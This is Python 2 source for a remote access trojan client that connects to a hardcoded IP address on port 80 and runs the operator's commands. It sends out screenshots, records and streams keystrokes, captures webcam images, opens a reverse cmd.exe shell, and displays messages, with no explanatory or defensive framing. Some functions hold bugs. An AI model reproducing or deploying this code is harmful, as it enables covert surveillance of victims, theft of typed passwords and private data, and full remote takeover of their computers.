import pythoncom
import pyHook
import pyscreenshot as ImageGrab
import cv2
import socket,subprocess,os, threading
import time

def init():
    while True:
        pack = sock.recv(1024)
        if pack == 'screenshot':
            screenshot()
        elif pack == "keylogger":
            keylogger()

        elif pack == "shell":
            global port2
            port2 = int(sock.recv(1024))
            shellr()

        elif pack == "webcam":
            webcam()
            
        elif pack == "imahacker":
            recvmsg()

def recvmsg():
    data = sock.recv(4025)
    file = open('msg.txt' , 'w')
    file.write(data)
    file.close()
    def msg():
        os.system("notepad.exe msg.txt")

    printmsg = threading.Thread(target=msg)
    printmsg.start()
    
def shellr():
    s = socket.socket()
    try:
        time.sleep(2)
        s.connect((ip, int(port2)))
    except Exception as erro:
        print erro
        print ip, port2, type(port2)
        time.sleep(10)
    def shell_recv(s, p):
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()

    def shell(s, p):
        while True:
            s.sendall(p.stdout.read(1))


    p=subprocess.Popen(["\\windows\\system32\\cmd.exe", '-i'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
    rshell_thread = threading.Thread(target=shellrecv, args=[s, p])
    rshell_thread.daemon = True
    rshell_thread.start()

    shell_thread = threading.Thread(target=shell, args=[s, p])
    shell_thread.daemon = True
    shell_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()



def screenshot():
    try:
        def main():
            imagem = ImageGrab.grab()
            imagem.save('log', 'jpeg')
            file = open('log', 'rb').read()
            sock.sendall(file)
            sock.send('ENDFILE')
            file.close()
        if __name__ == "__main__":
            main()
    except Exception as erro:
            import time
            sock.send('ERROR')
            sock.send(Erro)

def keylogger():
    def getkey(event):
        sock.send(str(event.Key))
        return True

    liskey = pyHook.HookManager()
    liskey.KeyDown = getkey
    liskey.HookKeyboard()
    pythoncom.PumpMessages()

def webcam():
    try:
        cam = cv2.VideoCapture(0)
        return_value, image = cam.read()
        cv2.imwrite('red', image)
        del(camera)
        file = open('red').read
        sock.sendall(file)
        sock.send('ENDFILE')
        file.close()
    except Exception as erro:
        sock.send("ERROR")
        sock.send(str(erro)+"\nErro: the computer does not have a webcam or the user does not have the appropriate permissions")
    
def connect():
    global ip
    ip = '179.104.71.20'
    port = 80

    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    import time
    ok = False
    while ok == False:
        try:
            sock.connect((ip, int(port)))
            ok = True
            print 'conectado'
        except Exception as erro:
            print "host off...", erro
            time.sleep(5)

    init()

connect()




